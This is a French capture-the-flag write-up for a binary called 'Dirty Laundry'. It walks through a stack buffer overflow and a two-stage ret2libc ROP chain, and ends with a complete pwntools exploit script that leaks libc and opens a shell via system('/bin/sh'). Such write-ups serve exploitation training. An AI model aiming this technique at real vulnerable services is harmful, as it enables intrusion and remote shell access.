# Dirty Laundry : Deep Dive sur l'exploitation Ret2Libc

## 1. Analyse Structurale et Mitigations

**Dirty Laundry** est l'archétype des challenges de dépassement de tampon (`Buffer Overflow`) moderne, où la pile n'est plus exécutable. L'expertise réside ici dans le chaînage de gadgets ROP (`Return Oriented Programming`).

### Audit de Sécurité :
```bash
$ checksec laundry
[*] 'laundry'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found  <-- VULNÉRABLE AU BOF
    NX:       NX enabled       <-- PAS DE SHELLCODE DIRECT
    PIE:      No PIE           <-- ADRESSES BINAIRES FIXES
```

**Analyse de l'expert :**
L'absence de **Canary** sur la pile permet un écrasement direct du registre `RIP`. Le binaire n'a pas de **PIE**, ce qui nous donne une base stable pour nos gadgets. Le **NX** impose une attaque de type **Return-to-Libc**.

---

## 2. Détection du Débordement (BoF)

En utilisant `gdb-pwndbg` et la fonction `cyclic`, on identifie l'offset de crash.

```bash
pwndbg> cyclic 100
aaaabaaacaaadaaa...
pwndbg> r
Enter your laundry: <cyclic_input>
...
Stopped reason: SIGSEGV
pwndbg> i r rip
rip 0x616161616161616b  # 'kaaaaaaa'
pwndbg> cyclic -l 0x616161616161616b
Found offset at 40
```

---

## 3. Stratégie d'Exploitation : "Leak and Strike"

C'est une attaque en deux temps car l'**ASLR** est activé sur le serveur, rendant l'adresse de la Libc imprévisible.

### Phase 1 : Leake de la Libc via PLT/GOT
Nous utilisons `puts@plt` pour afficher l'adresse réelle de `puts@got` (adresse dans la Libc).
**Gadget nécessaire** : `pop rdi; ret` (pour passer l'argument à `puts`).

```python
# Recherche de gadgets
$ ropper --file laundry --search "pop rdi"
0x0000000000400733: pop rdi; ret;
```

**ROP Chain 1 :**
1.  `Padding` (40 octets)
2.  `POP RDI; RET`
3.  `Address of puts@GOT`
4.  `Address of puts@PLT`
5.  `Address of main` (pour redémarrer le programme proprement)

### Phase 2 : Calcul et Shell
Une fois l'adresse de `puts` reçue, on calcule l'adresse de base de la Libc en soustrayant l'offset statique.
`base_libc = leaked_puts - libc.symbols['puts']`
`system = base_libc + libc.symbols['system']`
`bin_sh = base_libc + next(libc.search(b"/bin/sh"))`

**ROP Chain 2 :**
1.  `Padding` (40 octets)
2.  `RET` (Gadget d'alignement pour Glibc > 2.27)
3.  `POP RDI; RET`
4.  `Address of "/bin/sh"`
5.  `Address of system()`

---

## 4. Script d'Exploitation Expert

```python
from pwn import *

# Setup
elf = ELF('./laundry')
libc = ELF('./libc.so.6')
io = remote('challenge.pwn', 9999)

pop_rdi = 0x400733
ret = 0x400506

# Phase 1 : Leak
payload = b'A' * 40
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

io.sendline(payload)
io.recvuntil(b'done!\n')
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
log.info(f"Leaked puts: {hex(leak)}")

# Phase 2 : Shell
libc.address = leak - libc.symbols['puts']
payload = b'A' * 40
payload += p64(ret) # Stack alignment
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.symbols['system'])

io.sendline(payload)
io.interactive()
```

**Auteur : LWa7ch - Cybersecurity Engineer**
